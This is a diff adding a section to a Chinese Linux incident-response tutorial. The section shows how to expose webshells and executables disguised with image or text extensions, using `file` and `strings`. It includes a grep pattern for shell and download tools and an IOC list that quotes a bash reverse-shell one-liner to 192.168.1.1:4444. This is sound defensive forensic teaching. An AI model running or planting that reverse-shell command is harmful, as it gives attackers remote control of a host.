@@ -161,4 +161,52 @@ find /tmp -inum <inode>     然后找出该inode对应的所有路径
 ```
 
 ## 文件类型与strings排查
+>攻击者经常把 WebShell 或恶意程序伪装成图片、文本、配置文件。应急响应不能只看后缀,而要确认文件真实类型,再从内容里提取可疑命令、IP、URL 和路径。
 
+### 为什么不能只看扩展名
+Linux 不靠扩展名判断文件类型。一个叫 image.png 的文件,真实内容可能是 PHP;一个叫 test.txt 的文件,真实内容可能是 Linux 可执行文件(ELF)。
+
+**判断原则:文件后缀只提供参考,真实类型以 file 输出为准。**
+
+### 常见伪装方式
+
+| 伪装方式 | 示例 | 排查命令 | 判断 |
+|----------|------|----------|------|
+| 图片马 | `image.png` | `file image.png` | 图片后缀，真实是 PHP |
+| 文本伪装可执行 | `test.txt` | `file test.txt` | txt 后缀，真实是 ELF |
+| 无扩展名可执行 | `no` | `file no` | 名字普通，真实可执行 |
+| 无法识别 data | `.shell.php` | `file .shell.php` | 结合内容 / 路径继续判断 |
+
+### strings：提取可读字符串
+strings 从二进制 / 不可直接阅读的文件里提取可读字符串。它不能反编译,但能快速暴露命令、路径、IP、端口、URL、账号等线索。看到 bash -i、/dev/tcp、nc、curl/wget、chmod、/tmp、base64 这类字符串,优先列为攻击线索。
+
+**结合grep快速排查**
+
+```
+strings no | grep -E "bash|/dev/tcp|curl|wget|nc|/tmp|http"
+
+strings no | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'
+```
+
+### 输出 IOC 清单
+可疑文件：
+- /tmp/webshell_test/image.png
+- /tmp/webshell_test/test.txt
+- /tmp/webshell_test/no
+- /tmp/webshell_test/.shell.php
+
+可疑证据：
+- image.png：扩展名是 png，但 file 显示 PHP script
+- test.txt：扩展名是 txt，但 file 显示 ELF executable
+- no：ELF 文件中存在 bash -i /dev/tcp 反连命令
+- .shell.php：隐藏 PHP 文件，结合前两节时间和路径证据仍然可疑
+
+关键字符串：
+- bash -i>& /dev/tcp/192.168.1.1/4444 0>&1
+
+下一步（后续章节）：
+- 进程排查：确认可疑 ELF 是否正在运行
+- 端口排查：确认是否存在反连连接 / 监听端口
+- 日志排查：确认 image.png / .shell.php 是否被访问
+
+*文件扩展名不能当安全依据。file 识别真实类型,strings 提取明文线索。图片后缀的 PHP、文本后缀的 ELF、二进制里的反连命令,都是高价值 IOC。下一步,我们要确认这个反连 ELF 到底有没有在运行、有没有网络连接。*
